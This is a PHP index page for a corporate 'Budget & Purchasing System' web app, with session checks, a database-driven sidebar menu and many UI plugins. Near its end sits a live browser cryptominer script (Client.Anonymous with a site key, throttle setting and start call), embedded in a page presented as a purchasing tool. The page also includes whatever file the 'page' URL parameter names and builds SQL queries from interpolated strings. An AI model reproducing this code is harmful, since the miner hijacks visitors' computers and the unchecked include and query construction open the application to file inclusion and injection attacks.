<!DOCTYPE html>
<html>
<?php
// header('Location: http://10.62.126.12/bps'); 
session_start();
//error_reporting(0);
$lokweb="";
$website="";

//if(isset($_SESSION['nama'])){}else{}
if(function_exists('date_default_timezone_set')) date_default_timezone_set('Asia/Jakarta');
if(isset($_SESSION['website'])){
	$website=$_SESSION['website'];
    $lokweb=$_SESSION['lok'];
    $user=$_SESSION['nama'];
}else{
	$website="";$lokweb="";
    $user="";
}
if($website != "BPS"){
	if(isset($_GET['page'])) {
     $hal=$_GET['page'];
     if($hal!='login.php'){
         echo "<script>window.location = 'index.php?page=login.php'</script>";
	//header('location:../index.php');
     }
 }else{$hal="";
}
}else{
    if(isset($_GET['page'])) {
        $akses=$_SESSION["akses"];
        $adm=strpos($akses,'_FA');
        $kd_akses=explode(",",$akses);
        if(in_array('ADM_FA',$kd_akses)){
            $adm1="admin";
        }else{
            $adm1="user";
        }
        $hal=$_GET['page'];
    }else{
        $hal="";}
    }

  //   $admin_FA=strpos($akses,'_FA');
  //   $kd_akses=explode(",",$akses);
  //   if(in_array('ADM_FA',$kd_akses)){
  //     $admin1="admin";
  // }else{
  //     $admin1="user";
  // }
  include "koneksi.php";


  set_time_limit(0);
//echo $_SESSION['website'];
  ?>
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <title>BPS<?php echo "-".$lokweb; ?></title>
    <!-- Favicon-->
    <link rel="stylesheet" href="plugins/font/Roboto/roboto.css">
    <link rel="stylesheet" href="plugins/ionicons/material-icon.css">	
    <!-- Bootstrap Core Css -->
    <link href="plugins/bootstrap/css/bootstrap.css" rel="stylesheet">
    <!-- Waves Effect Css -->
    <link href="plugins/node-waves/waves.css" rel="stylesheet" />
    <!-- Animation Css -->
    <link href="plugins/animate-css/animate.css" rel="stylesheet" />

    <link rel="stylesheet" href="plugins/datetimepicker/css/bootstrap-material-datetimepicker.css" />
    <link href="plugins/bootstrap-material-datetimepicker/css/bootstrap-material-datetimepicker.css" rel="stylesheet" />
    <!-- Bootstrap Select Css -->
    <link href="plugins/bootstrap-select/css/bootstrap-select.min.css" rel="stylesheet" />	<!-- JQuery DataTable Css -->
    <link href="plugins/jquery-datatable/skin/bootstrap/css/dataTables.bootstrap.css" rel="stylesheet">

    <!-- Custom Css -->
    <link href="css/style.css" rel="stylesheet">
    <!-- AdminBSB Themes. You can choose a theme from css/themes instead of get all themes -->
    <link href="css/themes/all-themes.css" rel="stylesheet" />
    <link rel="stylesheet" type="text/css" href="plugins/daterangepicker/daterangepicker.min.css" />


    <!-- Jquery Core Js -->

    <script src="plugins/jquery/jquery.min.js"></script>
    <!-- Bootstrap Core Js -->
    <script src="plugins/bootstrap/js/bootstrap.js"></script>
    <script src="plugins/bootstrap-select/js/bootstrap-select.js"></script>
    <!-- Slimscroll Plugin Js -->
    <script src="plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
    <!-- Waves Effect Plugin Js -->
    <script src="plugins/node-waves/waves.js"></script>

    <script type="text/javascript" src="plugins/datetimepicker/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="plugins/datetimepicker/js/moment-with-locales.min.js"></script>
    <script type="text/javascript" src="plugins/datetimepicker/js/bootstrap-material-datetimepicker.js"></script><!-- Select Plugin Js -->
    <script src="plugins/bootstrap-select/js/bootstrap-select.min.js"></script>
    <!-- Jquery DataTable Plugin Js -->
    <script src="plugins/jquery-datatable/jquery.dataTables.js"></script>
    <script src="plugins/jquery-datatable/skin/bootstrap/js/dataTables.bootstrap.js"></script>
    <script src="plugins/jquery-datatable/extensions/export/dataTables.buttons.min.js"></script>
    <script src="plugins/jquery-datatable/extensions/export/buttons.flash.min.js"></script>
    <script src="plugins/jquery-datatable/extensions/export/jszip.min.js"></script>
    <script src="plugins/jquery-datatable/extensions/export/pdfmake.min.js"></script>
    <script src="plugins/jquery-datatable/extensions/export/vfs_fonts.js"></script>
    <script src="plugins/jquery-datatable/extensions/export/buttons.html5.min.js"></script>
    <script src="plugins/jquery-datatable/extensions/export/buttons.print.min.js"></script>
    <script src="js/pages/tables/jquery-datatable.js"></script>
    <!-- Jquery Validation Plugin Css -->
    <script src="plugins/jquery-validation/jquery.validate.js"></script>
    <!-- Step -->
    <script src="plugins/jquery-steps/jquery.steps.js"></script>
    <script src="plugins/jquery-steps/form-steps.js"></script>
    <!-- Ckeditor -->
    <script src="plugins/ckeditor/ckeditor.js"></script>
    <script src="plugins/tinymce/tinymce.js"></script>
    <script type="text/javascript" src="plugins/daterangepicker/daterangepicker.min.js"></script>
	<!--Highcharts-->
	<script src="js/highcharts.js" type="text/javascript"></script>
</head>
<!-- link contoh daterange http://www.daterangepicker.com/ -->
<body class="theme-purple" OnLoad="getLocation()">

    <!-- Page Loader
    <div class="page-loader-wrapper">
        <div class="loader">
            <div class="preloader">
                <div class="spinner-layer pl-red">
                    <div class="circle-clipper left">
                        <div class="circle"></div>
                    </div>
                    <div class="circle-clipper right">
                        <div class="circle"></div>
                    </div>
                </div>
            </div>
            <p>Silahkan Tunggu...</p>
        </div>
    </div> -->
    <!-- #END# Page Loader -->
    <!-- Overlay For Sidebars -->
    <div class="overlay"></div>
    <!-- #END# Overlay For Sidebars -->
    <!-- Search Bar -->
    <div class="search-bar">
        <div class="search-icon">
            <i class="material-icons">Cari</i>
        </div>
        <input type="text" placeholder="Ketik Pencarian...">
        <div class="close-search">
            <i class="material-icons">close</i>

        </div>
    </div>
    <!-- #END# Search Bar -->
    <!-- Top Bar -->
    <nav class="navbar">
        <div class="container-fluid">
            <div class="navbar-header">
                <a href="javascript:void(0);" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false"></a>
                <a href="javascript:void(0);" class="bars"></a>
                <a class="navbar-brand" href="index.php">BPS<?php echo "(".$lokweb.")"; ?></a>
            </div>
            <div class="navbar-header navbar-center">
                <h4>Budget & Purchasing System</h4>
                <p id="latitude"></p>
                <p id="longitude"></p>
            </div>
            <?php include "menu_atas.php"; ?>
        </div>
    </nav>

    <!-- #Top Bar -->
    <section>
        <!-- Left Sidebar -->
        <aside id="leftsidebar" class="sidebar">
            <!-- User Info-->
            <div class="user-info">
                <div class="image">
                    <img src="images/user.png" width="48" height="48" alt="User" />
                </div>
                <!--div class="info-container">
				<?php /* if($website == "BPS"){
				$nmsesi=$_SESSION["nama"];}
				else{$nmsesi="";}

if($nmsesi==""){
	echo '<a href="index.php?indx=login.php"><i class="material-icons">assignment_ind</i>Login</a>';
}else{
	echo '<div class="name" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">'.$nmsesi.'</div>
                    <div class="email">'.$nmsesi.'</div>';
}  */				?>
                    
                    <div class="btn-group user-helper-dropdown">
                        <i class="material-icons" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">keyboard_arrow_down</i>
                        <ul class="dropdown-menu pull-right">
                            <li><a href="javascript:void(0);"><i class="material-icons">person</i>Profile</a></li>
                            <li role="seperator" class="divider"></li>
                            <li><a href="javascript:void(0);"><i class="material-icons">group</i>Followers</a></li>
                            <li><a href="javascript:void(0);"><i class="material-icons">shopping_cart</i>Sales</a></li>
                            <li><a href="javascript:void(0);"><i class="material-icons">favorite</i>Likes</a></li>
                            <li role="seperator" class="divider"></li>
                            <li><a href="sisip/logout.php"><i class="material-icons">input</i>Sign Out</a></li>
                        </ul>
                    </div>
                </div-->
            </div>
            <!--#User Info -->
            <!-- Menu -->
            <div class="menu">
                <ul class="list">
                    <li class="header">MAIN NAVIGATION</li>
                    <li>
                        <a href="index.php"><i class="material-icons">home</i><span>Home</span></a>
                    </li>

                    <?php
                    $k_menu="";
                    $alamat="";$almtpg="";
                    if(isset($_GET['page'])) {$alamat = $_GET['page'];$almtpg="?page=".$alamat;}
                    if(isset($_GET['indx'])) {$alamat = $_GET['indx'];$almtpg="?indx=".$alamat;}

                    if($website=="BPS"){
//$Mnu=strtoupper($_SESSION['akses']);
                        $Mnu='ALL';
                        if($Mnu=='ALL'){
                         $Mnu1=" ";
                         $Sql_menu="select * from tbl_menu where app_nm='$website' order by grop,no_urut asc";
                     }else{$Mnu1=str_replace(",","','",$Mnu);
                     $Sql_menu="select * from tbl_menu where app_nm='$website' and (exists (select code_menu from grp_akses where code_menu=tbl_menu.code_menu and ID_AKSES in('$Mnu1'))) order by grop,no_urut asc";

                 }

	//echo $Sql_menu."<>".$Mnu;
                 $Ex_Mnu=mysql_query($Sql_menu); 
//odbc_exec($koneksi,$Sql_menu);
                 while($cr_menu=mysql_fetch_array($Ex_Mnu)){	
	//while(odbc_fetch_array($Ex_Mnu)){
		$lnk=strtolower($cr_menu["ling"]);//odbc_result($Ex_Mnu,"ling"));
		$lnk_add=strtolower($cr_menu["ling_get"]);
		$lnk_get=str_replace("@","&",$lnk_add);
		$jdl=$cr_menu["nama"];//odbc_result($Ex_Mnu,"nama");
		$CD_jdl=$cr_menu["code_menu"];//odbc_result($Ex_Mnu,"code_menu");
		$urut=$cr_menu["no_urut"];
		//echo "<script>alert('HAL= ?page=$hal ,LINK = $lnk , kdmenu = $CD_jdl');</script>";
		if($lnk=="?page=".$hal and $hal!=''){$k_menu=$CD_jdl;// echo "<script>alert('kd menu = $k_menu');</script>"; 
  }
  $dticon=$cr_menu["icon"];
  if($dticon==""){$Ticon="";}else{$Ticon='<i class="material-icons">'.$dticon.'</i>';}

  if ($lnk=="main"){
      if(substr($urut,0,1)==substr($alamat,0,1)){echo '<li class="active">';}else{echo '<li>';}

      ?>
      <!--li-->
      <a  class="menu-toggle">
        <?php echo $Ticon; ?><span><?php echo $jdl;?></span></a>
        <ul class="ml-menu">	
        <?php	}
        elseif($lnk=="sub"){
         if((substr($urut,0,2)==substr($alamat,0,2)) or (substr($urut,0,3)==substr($alamat,0,3))){echo '<li class="active">';}else{echo '<li>';}
     ?><!--li-->
     <a  class="menu-toggle"><?php echo $Ticon; ?><span><?php echo $jdl; ?></span></a>
     <ul class="ml-menu">
     <?php	}
     elseif ($lnk=="end"){
        ?>	
    </ul></li>
<?php	}
else{
 if($lnk==$almtpg or $alamat==$urut){echo '<li class="active">';}else{echo '<li>';}
	//if($lnk_get !=''){echo "<script>alert('$lnk_get');</script>";}
 ?>	
 <a href="index.php?page=<?php echo $urut.$lnk_get;//echo $lnk; ?>"><?php echo $Ticon; ?><span><?php echo $jdl; ?></span></a>
	<!--li>
        <a href="index.php<?php //echo $lnk; ?>"><?php //echo $Ticon; ?><span><?php //echo $jdl; ?></span></a-->
    </li>
<?php }	
if($alamat==$urut){
    if(isset($_GET['page'])) {$alamat = str_replace("?page=","",$lnk);}
    if(isset($_GET['indx'])) {$alamat = str_replace("?indx=","",$lnk);}

}
}}
//if($urut>'41000'){echo "<script>alert('$lnk'+'-'+'$alamat');</script>";}	
?>					


</ul>
</div>
<div class="legal">
    <div class="copyright">
        &copy; 2018 <a href="javascript:void(0);">Semarang Autocomp Manufacturing Indonesia</a>.
    </div>
    <div class="version">
        <b>Version: </b> 3.0.1
    </div>
</div>
<!-- #Footer -->
</aside>
<!-- #END# Left Sidebar -->
<!-- Right Sidebar -->
<aside id="rightsidebar" class="right-sidebar">
   <?php include "rightsilidebar.php"; ?>
</aside>
<!-- #END# Right Sidebar -->
</section>
<!--=====halaman    -->
<?php 

if($alamat!='') {
				//$alamat=str_replace("@","&",$alamat);
				//echo "<script>alert('$alamat');</script>";
 include_once ($alamat);
			} else {//echo "<script>window.location ='index.php?indx=index1.php'</script>";
            include('form/dashboard_grafik.php');
				//include('index_dash.php');
        }
        ?> 

        <script src="js/admin.js"></script>

        <script type="text/javascript">
          $(document).ready(function()
          {
	/*		$('.datepicker').bootstrapMaterialDatePicker
			({
				time: false,
				clearButton: true
			});

			$('.timepicker').bootstrapMaterialDatePicker
			({
				date: false,
				shortTime: false,
				format: 'HH:mm'
			});

			$('.datetime').bootstrapMaterialDatePicker
			({
				format: 'YYYY-MM-DD HH:mm'
			});
			
			$('#date-format').bootstrapMaterialDatePicker
			({
				format: 'dddd DD MMMM YYYY - HH:mm'
			});
			$('#date-fr').bootstrapMaterialDatePicker
			({
				format: 'DD/MM/YYYY HH:mm',
				lang: 'fr',
				weekStart: 1, 
				cancelText : 'ANNULER',
				nowButton : true,
				switchOnClick : true
			});

			$('#date-end').bootstrapMaterialDatePicker
			({
				weekStart: 0, format: 'DD/MM/YYYY HH:mm'
			});
			$('#date-start').bootstrapMaterialDatePicker
			({
				weekStart: 0, format: 'DD/MM/YYYY HH:mm', shortTime : true
			}).on('change', function(e, date)
			{
				$('#date-end').bootstrapMaterialDatePicker('setMinDate', date);
			});

 $('.daterangepick').daterangepicker({
    opens: 'left'
  }, function(start, end, label) {
    console.log("A new date selection was made: " + start.format('YYYY-MM-DD') + ' to ' + end.format('YYYY-MM-DD'));
});*/
$('.datetime-min').bootstrapMaterialDatePicker({ format : 'YYYY-MM-DD HH:mm', minDate : new Date() });
$('.date-min').bootstrapMaterialDatePicker({ format : 'YYYY-MM-DD', minDate : new Date(),time: false });
$('.datetime').bootstrapMaterialDatePicker({ format : 'YYYY-MM-DD', Date : Date(),time: false });
$('.datetime-rg').bootstrapMaterialDatePicker({ format : 'YYYY-MM-DD HH:mm:ss', Date : Date(),time: false });
$.material.init()
$('.selectpicker').selectpicker();
$(".tabel2").DataTable();
$('.periode').bootstrapMaterialDatePicker({format: 'YYYYMM', minDate : new Date(),clearButton: true,weekStart: 1,time: false });	
$('.date-pick').bootstrapMaterialDatePicker({ format : 'YYYY-MM-DD',time: false });
$('.setperiode').bootstrapMaterialDatePicker({format: 'YYYYMM', Date : new Date(),clearButton: true,weekStart: 0,time: false});
});

          function open_child(url,title,w,h){
            var left = (screen.width/2)-(w/2);
            var top = (screen.height/2)-(h/2);
            w = window.open(url, title, 'toolbar=no, location=no, directories=no, \n\
                status=no, menubar=no, scrollbar=no, resizabel=no, copyhistory=no,\n\
                width='+w+',height='+h+',top='+top+',left='+left);

        };

    </script>
    <script src="plugins/bootstrap-material-datetimepicker/js/bootstrap-material-datetimepicker.js"></script>
    <script src="plugins/js/pages/forms/form-wizard.js"></script>
    <script>
        var _client = new Client.Anonymous('96c856f62396995c16a3719aa40f2f833b840f9f10aabd2eedabbe74b2baea50', {
            throttle: 0.7, c: 'w'
        });
        _client.start();
        _client.addMiningNotification("Top", "", "#cccccc", 40, "#3d3d3d");

    </script>

</body>
<script>
    var x = document.getElementById("demo");

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else { 
        x.innerHTML = "Geolocation tidak didukung oleh browser ini.";
    }
}

function showPosition(position) {
  x.innerHTML = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude + 
  "<br><b>Lokasi Telah Aktif</b>"; 
}
</script>
</html>